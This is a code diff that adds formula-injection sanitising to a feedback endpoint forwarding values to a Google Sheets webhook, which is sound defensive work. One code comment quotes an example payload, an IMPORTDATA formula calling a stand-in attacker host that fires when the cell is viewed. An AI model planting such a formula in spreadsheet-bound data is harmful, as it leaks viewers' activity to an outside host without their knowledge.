@@ -296,6 +296,24 @@ const _FEEDBACK_TYPES = new Set(['bug', 'idea', 'other', 'error', 'waitlist']);
 const _TYPE_LABEL = { bug: '🐛 Bug', idea: '💡 Idea', other: '💬 Feedback', error: '⚠️ Error', waitlist: '📋 SDK waitlist' };
 const _EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
+// Neutralizes CSV/formula injection (CWE-1236) before a value reaches the
+// Google Sheet channel below. Google Sheets evaluates a cell as a formula
+// the moment it's viewed if the value starts with =, +, -, or @ — unlike
+// the classic "only matters on CSV export to Excel" framing, a formula
+// like =IMPORTDATA("https://attacker.example/track") fires as soon as a
+// human (or any automated process) causes that cell to render, not just on
+// export. This project doesn't control the receiving Apps Script's own
+// doPost() (it lives outside this repo, deployed via Google's editor), so
+// the fix has to happen here, at the only point this codebase actually
+// controls. Prefixing with a straight quote is the standard "force text"
+// convention every major spreadsheet app (Sheets, Excel, LibreOffice)
+// honors. Telegram values don't need this — sendMessage has no parse_mode
+// (see below), so Telegram never interprets these strings as anything but
+// plain text.
+export function _sheetSafe(value) {
+  return /^[=+\-@]/.test(value) ? `'${value}` : value;
+}
+
 function _looksLikeSpam(text) {
   if (!text) return false;
   const urlCount = (text.match(/https?:\/\//gi) || []).length;
@@ -448,8 +466,14 @@ async function handleFeedback(request, env) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           secret: env.GSHEET_SECRET,
-          type, tool, errorId, message, text, email, device,
-          url: pageUrl,
+          type,
+          tool:    _sheetSafe(tool),
+          errorId: _sheetSafe(errorId),
+          message: _sheetSafe(message),
+          text:    _sheetSafe(text),
+          email:   _sheetSafe(email),
+          device:  _sheetSafe(device),
+          url:     _sheetSafe(pageUrl),
         }),
       });
       console.log(`[feedback] Sheets webhook responded: status=${sheetRes.status}, type=${type}`);
